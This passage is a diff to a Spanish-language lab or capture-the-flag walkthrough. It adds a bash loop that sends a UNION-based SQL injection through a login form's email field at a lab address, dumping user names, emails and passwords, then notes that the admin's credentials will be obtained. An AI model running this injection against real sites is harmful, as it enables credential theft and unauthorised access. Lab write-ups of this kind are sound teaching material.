@@ -88,8 +88,11 @@ Encontramos
 
 
 Enumeraremos el contenido de las siguientes columnas
+```bash
+for i in $(seq 0 100); do echo "[+] Para el numero $i: $(curl -s -X POST http://10.10.11.130/login --data "email=test@test.com' union select 1,2,3,group_concat(name,0x3a,email,0x3a,password) from user limit $i,1-- -&password=test" | grep "Welcome" | sed 's/^ *//' | awk 'NF{print $NF}' | awk '{print $1}' FS="<")"; done
+```
 
-
+Obtendremos las credenciales del usuario admin
 
 
 
